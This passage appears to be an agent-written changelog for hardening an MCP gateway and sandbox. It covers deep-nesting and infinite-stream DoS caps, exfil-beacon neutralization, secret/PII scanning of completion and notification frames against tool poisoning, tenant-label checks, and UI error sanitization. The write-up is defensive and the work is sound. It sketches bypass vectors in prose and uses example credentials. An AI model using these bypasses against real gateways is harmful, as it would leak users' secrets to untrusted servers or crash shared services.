+- **CHG-0113** (2026-07-03) — **LOW-MED cross-tenant residual (completes CHG-0112 for volumes): broker destroy
+  removed the org VOLUME by name without label verification**. CHG-0112 made the org LABEL authoritative for the
+  CONTAINER (`find_container`), but `destroy` still removed the org's auth VOLUME (`/data/mcp-auth`) purely by its
+  lossy-sanitized `volume_name(slug)` with NO label check — and the volume was auto-created UNLABELED, so it had no
+  label to verify. A legacy/reused volume owning the canonical name but belonging to a DIFFERENT org (a pre-CHG-0111
+  colliding slug) would be DESTROYED for the wrong org (cross-tenant data destruction). **FIX
+  (`services/mcp-broker/src/sandbox/docker_manager.py`):** (1) `_ensure_volume` explicitly creates the volume WITH
+  `labels(org_slug)` before the container run (idempotent + best-effort; a pre-existing volume is left as-is; failure
+  never blocks provisioning since the run auto-creates by name); (2) `destroy` reads `_volume_labels` and REFUSES to
+  remove a volume whose `LABEL_ORG_SLUG` is present AND differs from the requested org (logs + skips, fail-closed);
+  an unlabeled-legacy volume (name authoritative for canonical slugs post-CHG-0111) or a same-org volume is still
+  removed. The org LABEL is now the tenant key for the volume too. +5 tests. Gate: 8 volume + 155 broker passed;
+  gateway unaffected (broker-only). Oracle N/A (routing/isolation fix, no PII-text egress delta). touched: broker
+  `DockerManager` volume lifecycle; completes CHG-0111 (slug validation) + CHG-0112 (container label verification).
+  Evidence `mcp-parallel/findings/backstop-p-broker-volume-label-verify/`.
+  **AUDIT (verification-only, no code change):** re-probed the other tenant-selector surfaces, all ALREADY hardened —
+  gateway OAuth token store (org-prefixed clean-slug key; flow/callback/status org-scoped, one-time signed state,
+  PKCE, token bound from the trusted flow record, callback XSS-escaped B3); control-plane `_request_org` (tenant from
+  authed profile OR `secrets.compare_digest`-validated gateway-internal `X-Org-Slug`, client-supplied org NOT
+  honored/not spoofable; `MCPEvent` sanitizes ALL channels); gateway tool-call cap per-key. FLAGGED (not fixed —
+  control-plane test env unavailable here: no venv, `django`/`fakeredis` not importable; AND not reachable today, all
+  callers gated): `_gateway_request_org` honors `X-Org-Slug` relying on the view permission gate rather than
+  self-verifying the internal secret — a defense-in-depth self-verify is deferred to a gated iteration.
+
+- **CHG-0114** (2026-07-03) — **MEDIUM fail-open DoS: deep-nested JSON result crashed `_neutralize_exfil_deep`**
+  (self-correction of backstop CHG-0097). The render-leak neutralizer parses the WHOLE result JSON and walks it per
+  string leaf, but `_walk` had NO depth bound. CPython `json.loads` (C scanner) PARSES thousands-deep JSON that the
+  Python `_walk` then can't traverse (recursion limit ~1000) → `RecursionError`; the `try/except` covered only
+  `json.loads` (not `_walk`/`json.dumps`), so it propagated to tier1's exfil block which SWALLOWED it — SILENTLY
+  SKIPPING exfil-beacon / markdown-split neutralization for that result (fail-OPEN of the CHG-0096–0099 defense) and
+  a per-call stack-exhaustion vector. Byte-verified: `_neutralize_exfil_deep(json.dumps(nested(6000)))` raised
+  RecursionError; the floor returned clean (exfil check bypassed). **FIX (`mcp_scan_orchestrator.py`):** `_walk` is
+  DEPTH-BOUNDED (`_MAX_EXFIL_WALK_DEPTH=200`, env `MCP_EXFIL_WALK_MAX_DEPTH`) — beyond the cap the subtree is returned
+  as-is (a beacon nested this deep can't reconstruct client-side, and the whole text is still tier1-scanned) — and the
+  walk + re-serialize are wrapped in `try/except` → fall back to string-level `_neutralize_render_leaks`. Deep results
+  no longer exhaust the stack NOR silently disable the defense; realistic shallow beacons still defanged. +6 tests.
+  Gate: 33 exfil + 1699 gateway passed, 0 failed; broker unaffected. Oracle N/A — DoS + beacon-defang fix (no
+  RecursionError + beacon-absent byte assertions authoritative). RESIDUAL: a beacon nested PAST the 200 cap is not
+  per-leaf-defanged (not a realistic client auto-render vector; closing the stack-DoS is the priority). touched: the
+  owning-session orchestrator `_neutralize_exfil_deep`. Evidence `mcp-parallel/findings/backstop-p-exfil-deep-nest-dos/`.
+
+- **CHG-0115** (2026-07-03) — **LOW-MED resource-bomb containment + monitor fix: proactive nesting-depth cap on tool
+  RESULTS**. A result STRUCTURE nested thousands deep makes the recursive scan/serialize hit Python's recursion limit
+  (~1000) → `RecursionError`. `_scan_tool_result_floor`'s except already fail-CLOSED (so it never LEAKED), but (a) it
+  relied on catching a fragile mid-scan RecursionError (generic `SCAN_ERROR`) and (b) under a per-tool **`monitor`**
+  action (observe-only, must NEVER block) the scan still ran, RecursionError'd, and fail-closed → a WRONGFUL block
+  violating the monitor contract. **FIX (`mcp_proxy.py`):** a new O(depth-bounded), ITERATIVE `_exceeds_nesting_depth`
+  (its own explicit stack — the guard can't itself be recursion-DoS'd) runs BEFORE the scan; past
+  `_MCP_MAX_RESULT_DEPTH` (500, env `MCP_MAX_RESULT_DEPTH`) it branches on the resolved action — real action → fail
+  CLOSED (`result_too_deeply_nested` + `RESOURCE_LIMIT`); `monitor` → forward UNSCANNED (never block,
+  `monitor_scan_skipped`). Deep results can no longer crash the scan, get a clear audit reason, and monitor stays
+  observe-only. +4 tests. Gate: 11 block-count-cap + 1703 gateway passed, 0 failed; broker unaffected (gateway-only).
+  Oracle N/A — DoS-containment/robustness fix, no PII-text leak delta. touched: result floor `_scan_tool_result_floor`
+  (extends CHG-0104; complements CHG-0114). Evidence `mcp-parallel/findings/backstop-p-result-depth-cap/`.
+
+- **CHG-0116** (2026-07-03) — **LOW-MED resource-bomb + monitor fix (INPUT-side twin of CHG-0115): proactive
+  nesting-depth cap on inbound tool ARGS**. CHG-0115 capped the RESULT floor, but `_scan_tool_args_block` (scans
+  attacker-controlled tool-call ARGUMENTS) had none — deep args RecursionError'd the recursive input scan (caught by
+  its except as a fragile generic `arg_scan_error`, AND under a per-tool `monitor` action → a WRONGFUL fail-closed
+  block violating observe-only). **FIX (`mcp_proxy.py`):** `_scan_tool_args_block` runs the same iterative
+  `_exceeds_nesting_depth` (CHG-0115) BEFORE the scan; past `_MCP_MAX_ARG_DEPTH` (defaults to
+  `_MCP_MAX_RESULT_DEPTH`=500, env `MCP_MAX_ARG_DEPTH`) it branches on the resolved action — real action → fail CLOSED
+  (`args_too_deeply_nested` + `RESOURCE_LIMIT`); `monitor` → forward the args UNCHANGED (`monitor_scan_skipped`, never
+  block). Deep args can no longer crash the scan, get a clear reason, monitor stays observe-only; the credential
+  force-block on shallow args is unchanged. +3 tests. Gate: 14 resource-limit + 1706 gateway passed, 0 failed; broker
+  unaffected (gateway-only). Oracle N/A — DoS-containment fix, no PII-text leak delta. touched: inbound scanner
+  `_scan_tool_args_block` (input-side twin of CHG-0115; parity with CHG-0104). Evidence
+  `mcp-parallel/findings/backstop-p-args-depth-cap/`.
+
+- **CHG-0117** (2026-07-03) — **MEDIUM fail-open DoS: non-finite SSE stream had no TOTAL bound (infinite-stream
+  resource bomb)**. The ext-proxy NON-finite SSE `stream_gen` (CHG-0098 — server notifications / `*subscribe`) caps
+  each EVENT at 1MB and never buffers the whole stream, but had NO cap on total bytes / events / duration. An
+  untrusted (compromised allowlisted) upstream can stream an INFINITE sequence of small (<1MB) events forever — the
+  `async for chunk in resp.aiter_bytes()` loop runs indefinitely, holding the gateway connection, burning CPU
+  scanning each event, and egressing unbounded data; httpx's per-read timeout does NOT bound a slow-but-steady
+  infinite stream. **FIX (`mcp_proxy.py`):** `stream_gen` tracks `total_bytes` + `event_count`; once either crosses
+  `_MCP_SSE_STREAM_MAX_BYTES` (100MB, env `MCP_SSE_STREAM_MAX_BYTES`) or `_MCP_SSE_STREAM_MAX_EVENTS` (100000, env
+  `MCP_SSE_STREAM_MAX_EVENTS`) it CLOSES the stream fail-closed — yields `: [stream closed: resource limit]`, audits
+  `sse_stream_limit_exceeded`, returns (the `finally` still `aclose()`s the upstream resp + client). Generous defaults
+  ≫ any realistic long-lived feed; env-tunable. +3 tests. Gate: 8 ext-sse + 1709 gateway passed, 0 failed; broker
+  unaffected (gateway-only). Oracle N/A — DoS-containment fix, no PII-text leak delta. touched: `ext_mcp_proxy`
+  non-finite SSE path (extends CHG-0098; streaming-path twin of the CHG-0104/0115/0116 caps). Evidence
+  `mcp-parallel/findings/backstop-p-sse-stream-total-bound/`.
+
+- **CHG-0118** (2026-07-03) — **MEDIUM 1.4 leak + tool-poisoning: ext-proxy forwarded `completion/complete` +
+  `resources/templates/list` results UNSCANNED**. `ext_mcp_proxy` scans a result only when its method is in
+  `_EXT_FINITE_RESULT_METHODS` (`_ext_scan_result` gate). Two finite, server-controlled, model/user-facing result
+  methods were MISSING → forwarded RAW: `completion/complete` → `result.completion.values[]` (autocompletion strings
+  the client shows to the user/model — a secret/PII/beacon in a suggested value leaked); `resources/templates/list` →
+  `result.resourceTemplates[].{name,description,uriTemplate}` (server metadata, model-facing like `resources/list`,
+  which IS scanned). Same leak/tool-poisoning class as tool descriptions (CHG-0077) / initialize instructions
+  (CHG-0080). Byte-verified: a `completion.values` carrying `AKIAIOSFODNN7EXAMPLE` + `bob@corp.example` and a template
+  `description` carrying `AKIA…` + `10.9.8.7` egressed raw pre-fix. **FIX (`mcp_proxy.py`):** added both methods to
+  `_EXT_FINITE_RESULT_METHODS` → their finite results are buffered + scanned via the same result floor (mask/block +
+  render-leak neutralization + depth/block caps) on the JSON AND SSE branches; benign completions/templates preserved.
+  +3 tests. Gate: 3 + 55 ext-proxy + 1713 gateway passed, 0 failed; broker unaffected (gateway-only). Byte-level:
+  `completion.values` → `["key AKIA****MPLE","contact b***@c***.example"]`; template `description` → `AKIA****MPLE host
+  [INTERNAL_IPV4_REDACTED]`. Independent oracle (aidefence): `has_pii` true raw / false masked. touched: `ext_mcp_proxy`
+  finite-result scan set (extends CHG-0077 / CHG-0080). Evidence `mcp-parallel/findings/backstop-p-ext-completion-templates-scan/`.
+
+- **CHG-0119** (2026-07-03) — **MEDIUM 1.4 credential-egress: ext-proxy did not credential-scan `completion/complete`
+  CLIENT INPUT before egress (input-side twin of CHG-0118)**. CHG-0118 scanned the completion RESULT, but its input
+  was forwarded to the external server RAW. The ext inbound credential-scan (`_EXT_ARG_SCAN_METHODS` = tools/call,
+  prompts/get) only inspects `params.arguments`; `completion/complete`'s input has a DIFFERENT shape —
+  `params.argument.value` (the partial value the user is typing) + `params.context.arguments` — so it was never
+  scanned. A credential in that input egressed to the untrusted (allowlisted) external server. **FIX
+  (`mcp_proxy.py`):** `ext_mcp_proxy` extracts `argument.value` + `context.arguments` into a synthetic input dict and
+  runs it through `_scan_tool_args_block` (E12 credential force-block) BEFORE egress — a credential is BLOCKED
+  (JSON-RPC compliance error, never sent: `client.send` not awaited; audited `credential_blocked_inbound`); an inbound
+  redaction is written back into the body + audited (`pii_redacted_inbound`); benign input is forwarded unchanged.
+  Input + output of `completion/complete` are now both scanned (parity with tools/call). +2 tests. Gate: 4 completion
+  + 1720 gateway passed, 0 failed; broker unaffected (gateway-only). Byte-level: `argument.value` `"my key
+  AKIAIOSFODNN7EXAMPLE"` → blocked, secret never reaches `client.send`. Oracle N/A — aidefence blind to the AWS-key
+  class (send-not-awaited assertion authoritative). touched: `ext_mcp_proxy` inbound scan (input-side twin of
+  CHG-0118; extends CHG-0041 / CHG-0109). Evidence `mcp-parallel/findings/backstop-p-ext-completion-input-scan/`.
+
+- **CHG-0120** (2026-07-03) — **LOW tracing completeness: internal (chat-pipeline) routes dropped the X-Request-ID
+  correlation id (broken trace chain)**. CHG-0050/0051 propagate the inbound `X-Request-ID` into every MCPEvent AND
+  the broker `_adapter_forward` hop on `org_mcp_jsonrpc` + the bare REST route, but `internal_tools_call` +
+  `internal_discover_tools` recorded ALL audit events with NO `request_id` and called `_adapter_forward` with NO
+  `correlation_id` — so a chat-pipeline tool call / tool-sync trace ENDED at the internal gateway boundary (the noted
+  CHG-0050 residual). **FIX (`mcp_proxy.py`):** both routes compute `_mcp_request_correlation_id(request, 1)` once at
+  entry (prefers X-Request-ID, bounded; falls back to the JSON-RPC id), thread it as `request_id=` into ALL their
+  `_record_gateway_event` calls (incl. the nested `_scan_internal_result` closure + the `_scan_internal_tools_list`
+  helper, which gained a `request_id` param), and pass it as `correlation_id=` to `_adapter_forward` (which already
+  forwards it to the broker via `broker_send_rpc` CHG-0051 → broker log CHG-0052). Trace continuous gateway → broker →
+  sandbox on the chat path. NEW TEST `test_mcp_internal_correlation_id.py` (3) + fixed a CHG-0109 test mock signature.
+  Gate: 3 + 1756 gateway passed, 0 failed; broker 155. Oracle N/A — tracing-completeness fix, no PII-text egress delta.
+  Byte-level: with `X-Request-ID: trace-corr-99`, all internal audit `request_id` == it and `_adapter_forward(correlation_id=)`
+  == it. touched: internal routes; completes CHG-0050/0051/0052. Evidence `mcp-parallel/findings/backstop-p-internal-correlation-id/`.
+
+- **CHG-0121** (2026-07-03) — **LOW tracing completeness (LAST hop; closes the CHG-0052 residual): broker did not
+  forward X-Request-ID to the sandbox AGENT + the agent didn't log it**. CHG-0051/0052 propagate + LOG the correlation
+  id at the broker, and CHG-0120 threads it gateway → adapter, but the broker's `_post_agent_rpc` was called with NO
+  `request_id` and did `client.post(url, json=payload)` with NO headers — so the id never reached the in-container
+  sandbox AGENT, whose `/rpc` neither read nor logged it. The trace BROKE at the broker → agent hop. **FIX:** (1)
+  `services/mcp-broker/src/sandbox/routes.py`: `_forward_sandbox_rpc` passes its `request_id` to `_post_agent_rpc`,
+  which forwards it as an `X-Request-ID` header (omitted when absent — no spurious empty header); (2)
+  `services/mcp-broker/sandbox-image/agent/main.py`: `/rpc` reads `X-Request-ID` (FastAPI `Header`) and logs ONE line
+  at entry with SAFE metadata ONLY — org / server / transport / method / jsonrpc_id / request_id, NEVER
+  params/args/env/upstream (which can carry PII/secrets — mirrors the broker CHG-0052 log hygiene). Trace continuous
+  gateway → broker → sandbox agent. +2 broker tests + 1 agent test. Gate: 5 ready-retry + 157 broker + 7 agent passed;
+  gateway unaffected. Byte-level: agent log = `agent rpc org=test-org server=srv … request_id=trace-agent-7` (no
+  `npx`/args). Oracle N/A — tracing-completeness fix, no PII delta. touched: broker `_post_agent_rpc` + in-container
+  agent `/rpc`; completes CHG-0050/0051/0052/0120. Evidence `mcp-parallel/findings/backstop-p-agent-correlation-id/`.
+
+- **CHG-0122** (2026-07-03) — **MEDIUM 1.4 leak: finite SSE branch didn't scan interleaved server-pushed
+  notifications**. The ext-proxy FINITE SSE branch (tools/call / resources/* / prompts/*, buffered CHG-0039/0064)
+  called `_scan_reframe_sse_tool_result` with the DEFAULT `scan_notifications=False`. A finite MCP call's SSE response
+  can INTERLEAVE server-pushed notification frames (`notifications/progress`, `notifications/message`) BEFORE the final
+  result; with `scan_notifications=False` those frames are re-emitted VERBATIM (only the result/error event is scanned)
+  → a secret/PII in a mid-call notification egressed raw to the client/LLM, while the NON-finite stream (`stream_gen`)
+  already scanned notification params (CHG-0098). A finite-vs-non-finite asymmetry. Byte-verified: a
+  `notifications/message` frame carrying `AKIAIOSFODNN7EXAMPLE` + `bob@corp.example` interleaved before a benign
+  tools/call result egressed both raw. **FIX (`mcp_proxy.py`):** the finite branch now passes `scan_notifications=True`
+  → interleaved notification `params` are scanned (masked / fail-closed withheld) via the same result floor as the
+  final result; the result frame is still delivered, benign notifications pass through. +1 test. Gate: 12 sse + 1777
+  gateway passed, 0 failed; broker unaffected (gateway-only). Byte-level: the notification secret + email are absent
+  from the re-emitted SSE. Independent oracle (aidefence): `has_pii` true raw / false masked. touched: `ext_mcp_proxy`
+  finite SSE branch (parity with CHG-0098; extends CHG-0039/0064). Evidence `mcp-parallel/findings/backstop-p-finite-sse-notification-scan/`.
+
+- MCP-PAGE-CP01 | scripts/ralph/mcp_page_typesim.mjs (new) | WHAT: reusable type-sim Playwright harness (keyboard.type delay:40 / clear via Ctrl+A→Delete, NEVER fill; exports typeSim/login/openRegisterDialog) | WHY: comma-drop/focus-loss modal bug only reproduces under realistic keystrokes; fill() masks it | NOW DOES: CP01 smoke green (type 'a,b,c' into name → value correct, commas 2/2, focus held) | touched: none (new) | VERIFY: node scripts/ralph/mcp_page_typesim.mjs → ok:true
+
+- MCP-PAGE-CP02 | scripts/ralph/mcp_page_cp02_args_repro.mjs (new) | WHAT: type-sim repro of Args comma-drop | WHY: CP02 prove bug | NOW DOES: REPRODUCED — type "a,b,c --flag,x" into Args → "abc--flagx", commas 0/3 + space dropped, focus KEPT (separator-drop, not remount); name/url/command unaffected → bug is specific to the comma-separated Args onChange (root-cause CP04) | touched: none (MCPConnectorPanel Args input suspect) | VERIFY: node scripts/ralph/mcp_page_cp02_args_repro.mjs → bugReproduced:true
+
+- MCP-PAGE-CP03 | mcp_page_cp03_allfields_repro.mjs (new) + mcp_page_typesim.mjs (bounded click timeout) | WHAT: per-field type-sim record | WHY: CP03 record buggy fields | NOW DOES: args=SEP-DROP(0/3), env=SEP-DROP(0/1); name/url/description/command/bearer=clean; focus KEPT (not remount). Modal field map: Args ph "-y, @playwright/mcp@latest", Env ph "GITHUB_TOKEN=ghp_xxx", Command ph "npx". Two fields drop commas → common onChange (CP04 target) | touched: none (MCPConnectorPanel Args+Env onChange = CP05 fix) | VERIFY: node scripts/ralph/mcp_page_cp03_allfields_repro.mjs → buggyFields [args,env]
+
+- MCP-PAGE-CP04 | frontend/src/components/MCPConnectorPanel.jsx (analysis) | WHAT: ROOT CAUSE = controlled-input-bound-to-parsed-collection, NOT a remount | Args (:1499-1500): value=args.join(", ") + onChange split(",").map(trim).filter(Boolean) → typing "," makes ["a",""]→filter→["a"]→re-render "a" (comma erased); trim kills spaces. Env (:1509-1520): same with object round-trip | FIX (CP05): store raw text in state, parse to array/object only on submit (payload @168-169) not per keystroke | VERIFY(after fix): cp03 args/env → clean
+
+- MCP-PAGE-CP05 | frontend/src/components/MCPConnectorPanel.jsx | WHAT: FIX modal separator-drop — Args/Env inputs hold RAW TEXT (args_text/env_text), parsed to args[]/env_vars{} only at submit (buildServerPayload), never per keystroke; fallback to array/object for presets | WHY: CP04 array/object round-trip erased typed commas/spaces | NOW DOES: VERIFIED — CP03 buggyFields [], CP02 "a,b,c --flag,x" commas 3/3, vite build green (6.69s) | touched: MCPConnectorPanel.jsx (B1 logic intact) | VERIFY: cp03 [] + cp02 3/3 + npm run build
+
+- MCP-PAGE-CP06 | mcp_page_cp06_verify.mjs (new) + mcp_page_typesim.mjs (opts.fast) | WHAT: comprehensive modal-typing verify — long comma strings into every field, values correct + focus kept, 4 viewports x 2 themes, 0 console errors | WHY: CP06 gate prove CP05 fix holds everywhere | NOW DOES: ALL 8 combos PASS (allPass:true). SECTION A (modal typing bug CP01-06) COMPLETE | touched: none new | VERIFY: node scripts/ralph/mcp_page_cp06_verify.mjs → 8/8 PASS
+
+- MCP-PAGE-CP07 | frontend/src/components/MCPConnectorPanel.jsx (addServer refactor+cancelAdd+footer) + mcp_page_cp07_register_flow.mjs (new) | WHAT: Register attempts MCP connect+tool-discovery INLINE, modal stays OPEN during attempt (bug #2); create→sync inline→fail=inline error+stay open (Retry re-syncs same row)/success=close+list; Cancel deletes orphan row (never list 0 tools) | WHY: was POST then close immediately → 0-tools cards | NOW DOES: VERIFIED cp07Pass:true (example.com/mcp → stayedOpen:true, connecting+inline error), build green (6.30s) | FOLLOWUP: inline error leaks raw upstream (405 HTML) → sanitize in Section D CP16-19 | touched: MCPConnectorPanel.jsx (B1 intact) | VERIFY: node scripts/ralph/mcp_page_cp07_register_flow.mjs → cp07Pass:true
+
+- MCP-PAGE-CP08 | frontend/src/components/MCPConnectorPanel.jsx (retry PATCHes row before re-sync) + mcp_page_cp08_retry.mjs (new) | WHAT: fail→clear inline error+modal open→fix+Retry PATCHes edited config then re-syncs, no dup create | WHY: CP07 retry did not apply form edits | NOW DOES: VERIFIED via network — register example.com→405 inline error, edit URL→Retry fires PATCH+tools sync (no 2nd create), Cancel fires DELETE (orphan cleanup); cp08Pass:true, build green | FOLLOWUP: sanitize raw upstream error (Section D CP16-19) | touched: MCPConnectorPanel.jsx | VERIFY: node scripts/ralph/mcp_page_cp08_retry.mjs → cp08Pass:true
+
+- MCP-PAGE-CP09 | scripts/ralph/mcp_page_cp09_success.mjs (new verify; success branch already in CP07 addServer) | WHAT: verify register success — on tool discovery modal closes THEN server lists WITH tools (never 0) | HOW: Playwright route-mock sync(tools:3)+list(tools_count:3), decoupled from flaky shared sandbox | NOW DOES: cp09Pass:true (modalClosedOnToolDiscovery, listQueried, listedWithToolCount) | REAL-CONNECT NOTE: live Everything crashed exit -6 under parallel-loop sandbox stress (contention) — showed inline (validates CP07/08) + leaked internals (Section D target); real e2e = Section J | touched: none | VERIFY: node scripts/ralph/mcp_page_cp09_success.mjs → cp09Pass:true
+
+- MCP-PAGE-CP10 | scripts/ralph/mcp_page_cp10_verify.mjs (new, verify-only) | WHAT: comprehensive register-flow verify (3 scenarios via route-mock): A error→modal open+inline error; B connected/0-tools→modal open+error, never lists 0-tools; C tools>0→modal closes+lists with tools | NOW DOES: cp10Pass:true, neverListedZeroTools:true. SECTION B (register flow CP07-10) COMPLETE — bug #2 resolved | touched: none (verifies CP07-09) | VERIFY: node scripts/ralph/mcp_page_cp10_verify.mjs → cp10Pass:true
+
+- MCP-PAGE-CP11 (confirm) | WHAT: transport-routing current state | BACKEND: _is_sandbox_routed → stdio+ws always sandbox; http/sse sandbox when MCP_HTTP_VIA_SANDBOX on (running gateway=true, broker_send_rpc x4) → ALL 4 transports already route via per-org sandbox, gateway never dials upstream (P4.13/CHG-0026 done prior). CP12-14 already backend-complete | FRONTEND (CP15 gap): TRANSPORT_OPTIONS labels only stdio "Stdio (sandbox)" (:71); http/sse/ws no sandbox indicator; help text stdio-only → display WRONG | VERIFY: docker exec gateway env|grep MCP_HTTP_VIA_SANDBOX=true; grep _is_sandbox_routed mcp_proxy.py
+
+- MCP-PAGE-CP12 (verify) | WHAT: http/sse execution IN per-org sandbox agent + egress allowlist | CHAIN: gateway _adapter_forward → broker_send_rpc {url,allowed_hosts,headers} → broker /v1/sandbox/{org}/rpc → sandbox agent _validate_upstream (:48) rejects non-allowlisted host -32002; gateway never dials upstream. LIVE (CP07): example.com/mcp http sync → "Upstream MCP error 405" = sandbox agent dialed it (proof via sandbox path). Prior egress-proof: gateway dials upstream 0x | VERIFY: grep broker_send_rpc+allowed_hosts in _adapter_forward; grep _validate_upstream upstream_manager.py
+
+- MCP-PAGE-CP13 (verify) | WHAT: websocket execution IN sandbox agent (CHG-0026+iter39) | EVIDENCE: (1) gateway test_mcp_http_via_sandbox.py -k websocket → 2 passed (test_adapter_forward_websocket_uses_broker_send_rpc: ws routes via broker_send_rpc not in-gateway ws adapter); (2) sandbox agent upstream_manager ws_manager send_ws_jsonrpc(:434)/close_ws(:161), _AUTO_INIT includes websocket(:396); (3) control models url=CharField → ws:// accepted (iter39) | LIMITATION: no live ws server → unit+code verified | VERIFY: pytest ...-k websocket (2 passed)
+
+- MCP-PAGE-CP14 (verify) | WHAT: LIVE-proved gateway opens NO direct upstream connection (talks only to sandbox) | METHOD: register streamable-http example.com/mcp, fire syncs, sample gateway vs sandbox /proc/net/tcp+tcp6 ∩ example.com IPs | RESULT: GATEWAY dialed example.com=FALSE, SANDBOX=TRUE {104.20.23.154} → isolation holds. CODE: _is_sandbox_routed True all 4 transports→broker_send_rpc, direct-httpx fallback dead when flag on. Corroborates p4-13/EGRESS_HTTP_PROVEN | GOTCHA: fresh login (cached tok→401) + parse tcp6 (example.com IPv6-first) | VERIFY: CP14 snippet → gateway NOT, sandbox YES
+
+- MCP-PAGE-CP15 | frontend/src/components/MCPConnectorPanel.jsx | WHAT: frontend shows Sandboxed for ALL transports (bug #3): stdio label "Stdio (sandbox)"→"Stdio"; help text → all 4 transports run in per-org sandbox + Shield "Sandboxed" badge for every transport; server cards get a Shield Sandboxed badge next to transport | WHY: backend sandboxes all transports (CP12/13/14) but UI implied stdio-only | NOW DOES: VERIFIED per transport — Sandboxed badge visible for streamable-http/sse/websocket/stdio; build green (6.09s). SECTION C complete | touched: MCPConnectorPanel.jsx | VERIFY: cycle Transport → Sandboxed badge all 4
+
+- MCP-PAGE-CP16 | control/ai_mesh_control/mcp_connector/views.py | WHAT: sanitize MCP client-facing error path (bug #5/6/7) — registration/discovery sync errors clean+branded+NON-revealing (no upstream HTML, no exit codes, no proc keys, no "gateway logs") | WHY: CP07/09 leaked raw upstream ("Upstream MCP error 405: <!doctype...") + stdio "exited with code -6" to the client modal | NOW DOES: _sanitize_sync_error(raw,*,org_slug,server_slug) (views.py:407) logs raw at WARNING under 12-hex ref, returns category-branded summary (auth/start/egress/timeout/generic)+"(Ref: <ref>)"; applied at all 4 return points in _discover_tools_via_gateway → last_sync_error sanitized; mcp_proxy.py:1838 = PII-block recorder (not a leak). Deployed docker cp+restart | VERIFY: scripts/ralph/mcp_page_cp16_clean_error.py → http_405+stdio_badcmd PASS (leaks=[], has_ref, branded). Client error CODE + dev debug view = CP17/CP18
+
+- MCP-PAGE-CP17 | control views.py + frontend MCPConnectorPanel.jsx | WHAT: map internal MCP failures → clean msg + STABLE client error code + correlation id | NOW DOES: _classify_sync_error → (code,summary) with OOM(-9/137)=MCP_OUT_OF_MEMORY, crash(-6/134/sigabrt)=MCP_SERVER_CRASHED, image=MCP_IMAGE_UNAVAILABLE, +MCP_AUTH_FAILED/EGRESS_DENIED/TIMEOUT/START_FAILED/UNAVAILABLE (specific fingerprints checked BEFORE generic "exited with code"); SyncError(str) subclass carries .code+.ref (all existing str consumers unchanged); _resync_server_tools + sync view emit error_code+correlation_id; OAuth refresh-fail no longer leaks raw {exc}; frontend shows "Error code: <CODE>" under the inline modal error | VERIFY: scripts/ralph/mcp_page_cp17_error_codes.py (API) + mcp_page_cp17_ui.mjs (UI route-mock) + 12-case classifier unit — all PASS; build green. Dev debug channel = CP18
+
+- MCP-PAGE-CP18 | control views.py + urls.py | WHAT: DEVELOPER diagnostic channel — structured logs keyed by correlation id + staff-only debug endpoint showing the REAL cause, never exposed to clients | NOW DOES: _store_sync_diagnostic writes {ref,code,org,server,raw_cause[:4000],ts} to Django cache (django_redis) key mcp:diag:<ref> TTL 7d best-effort, from _sanitize_sync_error; new MCPDiagnosticDetailView GET /api/mcp-connector/diagnostics/<ref>/ IsAdminUser(is_staff) returns it (ref /^[0-9a-f]{6,32}$/, invalid→400/unknown→404); org clients+admins are never staff → never exposed | VERIFY: scripts/ralph/mcp_page_cp18_diag_channel.py cp18Pass:true — client msg no raw_cause; STAFF→200 sees "upstream HTTP 405: <!doctype...">; NON-STAFF→403 no leak; edges 400/404. Self-mints non-staff JWT (no committed credential). Also the CP19 round-trip proof
+
+- MCP-PAGE-CP20 | broker docker_manager.py + sandbox-image/agent/stdio_manager.py + gateway mcp_stdio_adapter.py + docker-compose.yml | WHAT: fix heavy-MCP (Ruflo) exit -9 OOM — graceful Node heap tuning + OOM-aware categorization | DIAGNOSIS: sandbox mem_limit=2048m, memswap==mem (SWAP OFF), NO node heap cap → heavy Node server >2GB SIGKILLed by kernel (-9/137) | NOW DOES: (1) _run_kwargs sets NODE_OPTIONS=--max-old-space-size=~75%*mem (=1536) so Node self-limits → graceful V8 "heap out of memory" abort w/ headroom instead of kernel SIGKILL (new config node_max_old_space_mb / env MCP_SANDBOX_NODE_MAX_OLD_SPACE_MB); (2) pure _classify_exit_reason detects OOM from stderr signature OR -9/137 FIRST → MCP_OUT_OF_MEMORY (bare 134 would misread as crash), mirrored in gateway; (3) compose documents MEMORY_MB + NODE_MAX_OLD_SPACE_MB knobs | VERIFY: 3 broker + 8 classifier + 10 gateway-stdio tests green; image rebuilt; LIVE zeroshield NODE_OPTIONS=1536, heap_size_limit=1560MB, forced overflow → graceful FATAL heap OOM (not SIGKILL). CP21=Ruflo connect/clean-error
+
+- MCP-PAGE-CP21 | broker docker_manager.py + sandbox stdio_manager.py + gateway adapter + control views.py + docker-compose.yml | WHAT: verify Ruflo connects+lists tools OR clean-errors; + configurable npm-cache tmpfs + ENOSPC→MCP_INSUFFICIENT_STORAGE | EVIDENCE: isolated probe (real image + real npx ruflo mcp start) at 4g/3g → valid MCP initialize (ruflo 3.0.0) + tools/list REAL tools (agent_spawn/swarm_init/memory_store/hooks_*). Default 2g/1g → npm-cache tmpfs(RAM)+node RSS hit 2GB cgroup → OOM -9 first | NOW DOES: (1) SandboxDockerConfig.npm_cache_size_mb (env MCP_SANDBOX_NPM_CACHE_SIZE_MB, def 1024) → /var/npm-cache tmpfs configurable; (2) ENOSPC detection in _classify_exit_reason + gateway + control classifier → new MCP_INSUFFICIENT_STORAGE code; (3) compose documents knob | VERIFY: 41 unit tests green; image rebuilt; LIVE Branch A cp21Pass:true error_code=MCP_OUT_OF_MEMORY + dev diag "Raise MCP_SANDBOX_MEMORY_MB" (not a raw crash); Branch B probe Ruflo connects+lists real tools. SECTION E complete
+
+- MCP-PAGE-CP22 (diagnose) | enforcement stats anomaly (0 BLOCK / high error) | live DB: allow 180790/error 2306/redact 265/block 46. BLOCK IS WIRED+FIRING (org_scope_violation ×36 + pii_blocked_inbound ×10, gateway-side); "0 BLOCK"=pre-traffic snapshot. REAL BUG: control MCPToolCallView returns 403 for enforcement (tool_disabled/tool_not_registered/schema_validation_failed) but its local _record_event is a NO-OP for gateway-originated calls (de-dup views.py:1166-1169); gateway records the 403 as decision=error backend_error_http_403 (mcp_proxy.py:3047) NOT decision=block → blocks miscounted as errors. "422 error"=error count; top backend_error_http_403 1708 (echo/get-sum, unsynced servers → tool_not_registered; Everything crashes exit -6 under load). Keys MATCH → not auth. FIX CP23: gateway maps enforcement 403/404 → decision=block
+
